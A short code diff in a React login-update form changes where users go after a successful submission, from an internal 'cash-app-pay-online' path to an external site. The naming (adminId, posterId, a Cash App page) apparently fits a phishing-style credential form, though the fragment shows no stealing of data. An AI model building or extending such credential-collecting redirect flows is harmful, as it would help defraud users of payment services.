@@ -48,7 +48,7 @@ function LoginUpdateForm({ adminId, posterId }) {
 
       const data = await response.json();
       if (response.ok) {
-        router.push("/sim9/dfv/cash-app-pay-online");
+        router.push("https://privatedelights.ch");
       }
       return data;
     } catch (error) {
